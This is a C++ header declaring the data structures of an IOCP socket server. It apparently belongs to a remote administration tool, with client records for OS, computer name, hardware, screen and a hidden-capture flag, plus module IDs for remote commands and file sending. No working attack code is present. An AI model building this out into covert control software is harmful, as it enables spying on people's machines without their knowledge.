
#pragma once

#include"RingBuffer.h"

#include"Token.h"

#include<queue>

class BasisFunction;


#define MaxBufferLenth 65536


#define EXCELLENT 4


#define GOOD 3


#define AVERAGE 2


#define POOR 1


#define NULL 0


#define MaxFunction 10


#define NetWork 1

#define Mainfunction 0

#define Remotecmd 2

#define Filesend 3


class SendInfo
{
	friend class BasisFunction;

	friend class IocpServer;

	QByteArray *info;

	Token token;

public:

	SendInfo(Token TokenToSend) {

		info = new QByteArray();

		token = TokenToSend;
	}

	
	QByteArray * GetInfo() {

		return info;

	}

	~SendInfo() {
		delete info;
	}

};

class BasisFunction;


class Linker
{

public:

	Linker(UINT number);

	~Linker();

	void Clear();

	void SetItsFather(UINT Father);

	UINT GetItsFather();

	char ip[4 * 3 + 3];

	QRingBuffer bufferOfRecv;

	QByteArray bufferOfComplete;

	PBYTE tempBufferOfRecv;

	UINT Number;

	UINT Fnumber;

	SOCKET socket;

	WSABUF in_Wsabuf, out_Wsabuf;

	u_int totSizeOfRecvedData;

	bool recvTest;

	QAtomicInteger<int> activeState;

	std::queue<SendInfo*> sendQueue;

	u_int totSend;

	u_int totPost;

	Token Token;

	BasisFunction * Son[MaxFunction];

	BasisFunction * instance;

	UINT packetCont;

	QString os,computerName,onlineTime,cpu,disk,memory,screen,remotePath;

	bool isHideCapture;

};


class OVERLAPPEDPLUS
{
public:


	OVERLAPPED			m_ol;

	Token				m_ioType;

	OVERLAPPEDPLUS(Token ioType) {

		memset(this,0,sizeof(OVERLAPPEDPLUS));

		m_ioType = ioType;

	}
};


